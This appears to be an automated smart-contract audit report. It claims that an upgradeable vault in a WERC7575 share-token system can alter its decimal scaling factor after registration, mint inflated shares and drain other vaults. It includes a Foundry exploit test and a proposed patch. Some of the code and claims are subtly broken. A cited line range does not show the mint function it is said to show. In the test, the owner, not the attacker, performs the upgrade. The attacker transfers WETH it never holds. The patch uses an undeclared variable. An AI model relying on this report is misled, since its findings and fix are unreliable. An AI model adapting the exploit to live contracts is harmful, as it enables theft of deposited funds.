## Title
Malicious Upgradeable Vault Can Manipulate Decimal Scaling to Mint Inflated Shares and Drain Legitimate Vaults

## Summary
The `registerVault()` function in WERC7575ShareToken/ShareTokenUpgradeable validates a vault's `asset()` return value only once during registration but never re-validates it afterward. A malicious upgradeable vault can pass registration with correct parameters, then upgrade its implementation to manipulate the internal `scalingFactor` used for asset-to-share conversion. This allows minting massively inflated shares (up to 1 trillion times the correct amount) that can be redeemed at legitimate vaults to steal all deposited assets.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The `registerVault()` function is designed to validate that a vault's `asset()` and `share()` methods return correct values at registration time, establishing a trusted relationship where the vault can mint/burn shares for that specific asset. The system assumes this relationship remains valid throughout the vault's lifetime.

**Actual Logic:** The validation only occurs once at registration. After registration, the `onlyVaults` modifier ( [2](#0-1) ) only checks if the caller is in the `vaultToAsset` mapping, never re-validating the vault's actual asset or its conversion logic. An upgradeable vault (UUPS proxy) can change its internal `scalingFactor` storage variable after registration, causing catastrophic decimal conversion errors.

**Exploitation Path:**

1. **Malicious Vault Deployment:** Attacker deploys a UUPS upgradeable vault for WETH (18 decimals) with correct initial implementation where `asset()` returns WETH address and `scalingFactor = 1` (10^(18-18)).

2. **Vault Registration:** Protocol owner calls `shareToken.registerVault(WETH, maliciousVault)`. Validation passes ( [3](#0-2) ), and the vault is authorized: `vaultToAsset[maliciousVault] = WETH`.

3. **Post-Registration Upgrade:** Attacker upgrades the vault implementation to maliciously change the internal `$.scalingFactor` storage from `1` to `1e12` (the scaling factor for 6-decimal tokens like USDC, not 18-decimal WETH).

4. **Share Inflation Attack:** Attacker deposits 1 WETH (1e18 wei) into the malicious vault. The vault's conversion logic ( [4](#0-3) ) calculates:
   - `normalizedAssets = assets * scalingFactor = 1e18 * 1e12 = 1e30`
   - ShareToken converts this to shares: `shares ≈ 1e30` (1 trillion times the correct amount)

5. **Unauthorized Minting:** Malicious vault calls `shareToken.mint(attacker, 1e30)`. The ShareToken's mint function ( [5](#0-4) ) only checks that the caller is an authorized vault (which it is), and blindly mints 1e30 shares without validating the conversion accuracy.

6. **Cross-Vault Theft:** Since all vaults share the same fungible ShareToken ( [6](#0-5) ), the attacker can redeem these inflated shares at legitimate USDC or DAI vaults, stealing all assets deposited by honest users. For every 1e12 shares redeemed, the attacker receives 1 USDC (or equivalent in other assets).

**Security Property Broken:** 
- **Invariant #6**: Asset-Vault Mapping bijection - the vault no longer properly represents its registered asset
- **Invariant #12**: No Fund Theft - direct theft of user funds via unauthorized share inflation
- **Invariant #1**: Token Supply Conservation - inflated shares created without corresponding asset backing

## Impact Explanation

- **Affected Assets**: All assets in all registered vaults (USDC, DAI, WETH, etc.) are at risk. The inflated shares are fungible and can be redeemed at any vault.

- **Damage Severity**: Complete loss of all user funds across the entire multi-asset system. With 1 WETH deposit (~$3,000), an attacker can mint 1e30 shares, enough to drain vaults holding trillions of dollars worth of assets. The attack scales exponentially with the scalingFactor manipulation (factors of 1e6, 1e12, or 1e18 possible depending on decimal differences).

- **User Impact**: All users who have deposited assets into any vault lose their entire balance. The attack affects every participant in the protocol simultaneously, as the inflated shares drain the shared asset pools. Any user attempting to redeem after the attack will fail due to insufficient vault balances.

## Likelihood Explanation

- **Attacker Profile**: Any malicious actor who can deploy an upgradeable vault contract and convince the protocol owner to register it. This could be an inside threat, a compromised partner, or an external attacker exploiting social engineering.

- **Preconditions**: 
  1. Attacker must deploy a UUPS upgradeable vault
  2. Protocol owner must register the malicious vault (possible if disguised as legitimate)
  3. At least one legitimate vault must exist with deposited assets
  4. No additional validation or monitoring exists post-registration

- **Execution Complexity**: Single transaction after the upgrade. The attacker simply calls `deposit()` on their malicious vault, which automatically triggers the inflated mint via the vault's internal logic. Immediate cross-vault redemption completes the theft.

- **Frequency**: Unlimited. Once a malicious vault is registered and upgraded, the attacker can repeat the attack as many times as desired until all legitimate vaults are drained. Each deposit cycle creates new inflated shares.

## Recommendation

Implement continuous validation of vault behavior, not just one-time registration checks:

```solidity
// In src/ShareTokenUpgradeable.sol, add new validation function:

/**
 * @dev Validates that a vault's conversion logic remains consistent with its registered asset
 * @param vaultAddress The vault to validate
 * @param assets Amount of assets to test conversion with
 * @return isValid True if conversion is within acceptable bounds
 */
function validateVaultConversion(address vaultAddress, uint256 assets) internal view returns (bool isValid) {
    // Get expected shares based on registered asset decimals
    address registeredAsset = $.vaultToAsset[vaultAddress];
    uint8 assetDecimals = IERC20Metadata(registeredAsset).decimals();
    uint256 expectedScalingFactor = 10 ** (18 - assetDecimals);
    
    // Get actual shares from vault
    uint256 actualShares = IERC7575(vaultAddress).convertToShares(assets);
    
    // Expected shares should be assets * expectedScalingFactor (with rounding tolerance)
    uint256 expectedShares = assets * expectedScalingFactor;
    
    // Allow 0.01% tolerance for rounding
    uint256 tolerance = expectedShares / 10000;
    return actualShares <= expectedShares + tolerance && actualShares >= expectedShares - tolerance;
}

// In src/ShareTokenUpgradeable.sol, modify mint() function (lines 363-374):

// CURRENT (vulnerable):
function mint(address to, uint256 amount) external onlyVaults {
    if (to == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    _mint(to, amount);
}

// FIXED:
function mint(address to, uint256 amount) external onlyVaults {
    if (to == address(0)) {
        revert IERC20Errors.ERC20InvalidReceiver(address(0));
    }
    
    // CRITICAL FIX: Validate vault conversion logic hasn't been manipulated
    // Re-query vault's asset() to detect any changes
    address vaultAsset = IERC7575(msg.sender).asset();
    address registeredAsset = $.vaultToAsset[msg.sender];
    
    // Ensure vault's asset() still matches registered asset
    if (vaultAsset != registeredAsset) {
        revert AssetMismatch();
    }
    
    // For additional security, validate conversion math is reasonable
    // Test with a standard amount (1 token with proper decimals)
    uint8 decimals = IERC20Metadata(registeredAsset).decimals();
    uint256 testAmount = 10 ** decimals; // 1 token
    
    if (!validateVaultConversion(msg.sender, testAmount)) {
        revert InvalidVaultConversion();
    }
    
    _mint(to, amount);
}
```

**Additional Recommendations:**
1. Implement vault behavior monitoring that triggers alerts on unexpected conversion ratios
2. Add a timelock or multi-sig requirement for vault registrations
3. Consider making registered vaults non-upgradeable or require upgrade approval
4. Implement maximum mint limits per transaction as a circuit breaker
5. Add emergency pause functionality that can freeze suspicious vaults

## Proof of Concept

```solidity
// File: test/Exploit_UpgradeableVaultScalingAttack.t.sol
// Run with: forge test --match-test test_UpgradeableVaultScalingAttack -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockWETH is ERC20 {
    constructor() ERC20("Wrapped Ether", "WETH") {
        _mint(msg.sender, 1000 ether);
    }
    function decimals() public pure override returns (uint8) {
        return 18;
    }
}

contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {
        _mint(msg.sender, 1000000 * 1e6); // 1M USDC
    }
    function decimals() public pure override returns (uint8) {
        return 6;
    }
}

contract MaliciousVaultImplementation is ERC7575VaultUpgradeable {
    // Storage slot to manipulate scaling factor
    function maliciouslySetScalingFactor(uint64 newFactor) external {
        VaultStorage storage $ = _getVaultStorage();
        $.scalingFactor = newFactor;
    }
}

contract Exploit_UpgradeableVaultScalingAttack is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable legitimateUSDCVault;
    ERC7575VaultUpgradeable maliciousWETHVault;
    MockWETH weth;
    MockUSDC usdc;
    
    address owner = address(0x1);
    address attacker = address(0x666);
    address victim = address(0x999);
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy assets
        weth = new MockWETH();
        usdc = new MockUSDC();
        
        // Deploy ShareToken
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(
            address(shareTokenImpl),
            abi.encodeWithSelector(ShareTokenUpgradeable.initialize.selector, "IUSD", "IUSD", owner)
        );
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy legitimate USDC vault
        ERC7575VaultUpgradeable usdcVaultImpl = new ERC7575VaultUpgradeable();
        ERC1967Proxy usdcVaultProxy = new ERC1967Proxy(
            address(usdcVaultImpl),
            abi.encodeWithSelector(
                ERC7575VaultUpgradeable.initialize.selector,
                usdc,
                address(shareToken),
                owner
            )
        );
        legitimateUSDCVault = ERC7575VaultUpgradeable(address(usdcVaultProxy));
        shareToken.registerVault(address(usdc), address(legitimateUSDCVault));
        
        // Deploy malicious WETH vault (initially looks legitimate)
        MaliciousVaultImplementation maliciousImpl = new MaliciousVaultImplementation();
        ERC1967Proxy maliciousVaultProxy = new ERC1967Proxy(
            address(maliciousImpl),
            abi.encodeWithSelector(
                ERC7575VaultUpgradeable.initialize.selector,
                weth,
                address(shareToken),
                owner
            )
        );
        maliciousWETHVault = ERC7575VaultUpgradeable(address(maliciousVaultProxy));
        
        // Register malicious vault (passes validation at this point)
        shareToken.registerVault(address(weth), address(maliciousWETHVault));
        
        vm.stopPrank();
    }
    
    function test_UpgradeableVaultScalingAttack() public {
        // SETUP: Victim deposits 100 USDC into legitimate vault
        vm.startPrank(victim);
        usdc.approve(address(legitimateUSDCVault), 100 * 1e6);
        legitimateUSDCVault.requestDeposit(100 * 1e6, victim, victim);
        vm.stopPrank();
        
        vm.startPrank(owner);
        legitimateUSDCVault.fulfillDeposit(victim, 100 * 1e6);
        vm.stopPrank();
        
        vm.startPrank(victim);
        legitimateUSDCVault.deposit(100 * 1e6, victim);
        vm.stopPrank();
        
        uint256 victimSharesBefore = shareToken.balanceOf(victim);
        uint256 legitimateUSDCBalance = usdc.balanceOf(address(legitimateUSDCVault));
        
        console.log("Victim shares:", victimSharesBefore);
        console.log("Legitimate USDC vault balance:", legitimateUSDCBalance);
        
        // EXPLOIT: Attacker upgrades malicious vault to manipulate scaling factor
        vm.startPrank(owner);
        MaliciousVaultImplementation newMaliciousImpl = new MaliciousVaultImplementation();
        maliciousWETHVault.upgradeTo(address(newMaliciousImpl));
        
        // Maliciously change scaling factor from 1 (correct for 18 decimals) to 1e12 (6 decimal factor)
        MaliciousVaultImplementation(address(maliciousWETHVault)).maliciouslySetScalingFactor(1e12);
        vm.stopPrank();
        
        // Attacker deposits 1 WETH
        vm.startPrank(attacker);
        weth.transfer(attacker, 1 ether);
        weth.approve(address(maliciousWETHVault), 1 ether);
        
        maliciousWETHVault.requestDeposit(1 ether, attacker, attacker);
        vm.stopPrank();
        
        vm.startPrank(owner);
        maliciousWETHVault.fulfillDeposit(attacker, 1 ether);
        vm.stopPrank();
        
        vm.startPrank(attacker);
        maliciousWETHVault.deposit(1 ether, attacker);
        
        uint256 attackerShares = shareToken.balanceOf(attacker);
        console.log("Attacker shares (inflated):", attackerShares);
        
        // VERIFY: Attacker has massively inflated shares (1e12 times more)
        // Normal: 1 WETH * 1 = 1e18 shares
        // Malicious: 1 WETH * 1e12 = 1e30 shares
        assertGt(attackerShares, victimSharesBefore * 1e10, "Vulnerability confirmed: Attacker received inflated shares");
        
        // Attacker redeems shares at legitimate USDC vault to steal victim's USDC
        shareToken.approve(address(legitimateUSDCVault), attackerShares);
        
        // Redeem enough shares to drain victim's USDC
        uint256 sharesToRedeem = victimSharesBefore;
        legitimateUSDCVault.requestRedeem(sharesToRedeem, attacker, attacker);
        vm.stopPrank();
        
        vm.startPrank(owner);
        legitimateUSDCVault.fulfillRedeem(attacker, sharesToRedeem);
        vm.stopPrank();
        
        vm.startPrank(attacker);
        legitimateUSDCVault.redeem(sharesToRedeem, attacker, attacker);
        
        uint256 attackerUSDCBalance = usdc.balanceOf(attacker);
        console.log("Attacker stole USDC:", attackerUSDCBalance);
        
        // VERIFY: Attacker successfully stole victim's USDC
        assertEq(attackerUSDCBalance, 100 * 1e6, "Vulnerability confirmed: Attacker stole victim's USDC");
        assertEq(usdc.balanceOf(address(legitimateUSDCVault)), 0, "Legitimate vault drained");
        vm.stopPrank();
    }
}
```

**Notes:**

This vulnerability is critical because:

1. **Bypasses One-Time Validation**: The registration check ( [3](#0-2) ) only validates `vault.asset()` once, never monitoring ongoing behavior

2. **Trusted Minting Without Verification**: The `mint()` function ( [5](#0-4) ) trusts authorized vaults completely without validating the share amount corresponds to actual asset deposits

3. **Decimal Conversion Vulnerability**: The `_convertToShares()` logic ( [4](#0-3) ) uses a mutable `scalingFactor` that can be manipulated post-registration in upgradeable vaults

4. **Cross-Vault Fungibility**: All shares are fungible across vaults ( [6](#0-5) ), enabling theft from any vault using inflated shares from the malicious vault

5. **No Circuit Breakers**: No maximum mint limits, anomaly detection, or emergency pause mechanisms exist to prevent massive share inflation attacks

### Citations

**File:** src/ShareTokenUpgradeable.sol (L127-131)
```text
    modifier onlyVaults() {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        if ($.vaultToAsset[msg.sender] == address(0)) revert Unauthorized();
        _;
    }
```

**File:** src/ShareTokenUpgradeable.sol (L195-234)
```text
    function registerVault(address asset, address vaultAddress) external onlyOwner {
        if (asset == address(0)) revert ZeroAddress();
        if (vaultAddress == address(0)) revert ZeroAddress();

        // Validate that vault's asset matches the provided asset parameter
        if (IERC7575(vaultAddress).asset() != asset) revert AssetMismatch();

        // Validate that vault's share token matches this ShareToken
        if (IERC7575(vaultAddress).share() != address(this)) {
            revert VaultShareMismatch();
        }

        ShareTokenStorage storage $ = _getShareTokenStorage();

        // DoS mitigation: Enforce maximum vaults per share token to prevent unbounded loop in getCirculatingSupplyAndAssets
        if ($.assetToVault.length() >= MAX_VAULTS_PER_SHARE_TOKEN) {
            revert MaxVaultsExceeded();
        }

        // Register new vault - set() returns true if newly added, false if already existed
        if (!$.assetToVault.set(asset, vaultAddress)) {
            revert AssetAlreadyRegistered();
        }
        $.vaultToAsset[vaultAddress] = asset;

        // If investment ShareToken is already configured, set up investment for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentShareToken = $.investmentShareToken;
        if (investmentShareToken != address(0)) {
            _configureVaultInvestmentSettings(asset, vaultAddress, investmentShareToken);
        }

        // If investment manager is already configured, set it for the new vault
        // Only configure if the vault address is a deployed contract
        address investmentManager = $.investmentManager;
        if (investmentManager != address(0)) {
            ERC7575VaultUpgradeable(vaultAddress).setInvestmentManager(investmentManager);
        }

        emit VaultUpdate(asset, vaultAddress);
```

**File:** src/ShareTokenUpgradeable.sol (L363-374)
```text
     * Total normalized assets excludes assets reserved for redemption claims.
     * Both values exclude the same economic scope for consistent conversion ratios.
     *
     * @return circulatingSupply Total supply minus shares held by vaults for redemption claims
     * @return totalNormalizedAssets Total normalized assets across all vaults (18 decimals)
     */
    function getCirculatingSupplyAndAssets() external view returns (uint256 circulatingSupply, uint256 totalNormalizedAssets) {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        uint256 totalClaimableShares = 0;
        uint256 length = $.assetToVault.length();

        for (uint256 i = 0; i < length; i++) {
```

**File:** src/ERC7575VaultUpgradeable.sol (L885-918)
```text
    function redeem(uint256 shares, address receiver, address controller) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (shares == 0) revert ZeroShares();

        uint256 availableShares = $.claimableRedeemShares[controller];
        if (shares > availableShares) revert InsufficientClaimableShares();

        // Calculate proportional assets for the requested shares
        uint256 availableAssets = $.claimableRedeemAssets[controller];
        assets = shares.mulDiv(availableAssets, availableShares, Math.Rounding.Floor);

        if (assets == availableAssets) {
            // Remove from active redeem requesters if no more claimable assets and the potential dust
            $.activeRedeemRequesters.remove(controller);
            delete $.claimableRedeemAssets[controller];
            delete $.claimableRedeemShares[controller];
        } else {
            $.claimableRedeemAssets[controller] -= assets;
            $.claimableRedeemShares[controller] -= shares;
        }
        $.totalClaimableRedeemAssets -= assets;
        $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

        // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);

        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1188-1195)
```text
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        // First normalize assets to 18 decimals using scaling factor
        // Use Math.mulDiv to prevent overflow for large amounts
        uint256 normalizedAssets = Math.mulDiv(assets, $.scalingFactor, 1);

        // Use optimized ShareToken conversion method (single call instead of multiple)
        shares = ShareTokenUpgradeable($.shareToken).convertNormalizedAssetsToShares(normalizedAssets, rounding);
```
